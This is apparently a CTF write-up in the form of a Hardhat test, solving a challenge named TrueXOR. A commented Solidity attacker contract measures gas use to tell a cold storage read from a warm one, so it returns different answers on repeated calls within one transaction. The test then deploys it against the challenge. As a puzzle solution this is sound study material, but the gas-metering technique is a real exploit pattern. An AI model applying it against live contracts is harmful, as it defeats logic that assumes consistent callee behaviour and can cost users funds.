 
//  Below is the detailed explanation and poc for the CTF of in hardhat and ether js

// contract Attacker_TrueXOR {
//     uint num;
//     function giveBool() public returns(bool){
//         uint gasleft_before = gasleft();
//         uint temp = num;
//         uint gasleft_after = gasleft();
//         if (gasleft_before - gasleft_after >2000)
//         {
//             return true;
//         }
//         return false;
//     } 
// }

// loading a varible from a cold slot costs 2100 gas where as hot slot costs 100 gas. 
// this can be used to differentiate whether the function is called for the first time or second time in a transaction.

import {loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { ethers } from "hardhat";

describe("TrueXOR", function () {
    
    async function deploymentState() {

    // Contracts are deployed using the first signer/account by default
    const [owner, attacker] = await ethers.getSigners();

    const TrueXOR = await ethers.getContractFactory("TrueXOR");
    const trueXOR = await TrueXOR.deploy();

    return { trueXOR,attacker,owner };
    }

    describe("Deployment", function () {
    it("Should be able to call callMe function ", async function () {
        const {trueXOR,attacker} = await loadFixture(deploymentState);

        const AttackerContract = await ethers.getContractFactory("Attacker_TrueXOR");
        const attackerContract = await AttackerContract.connect(attacker).deploy();
        
        const callMe_tx = await trueXOR.connect(attacker).callMe(attackerContract.address);
        
        await expect(callMe_tx).to.equal(true);

    })
    });
});
    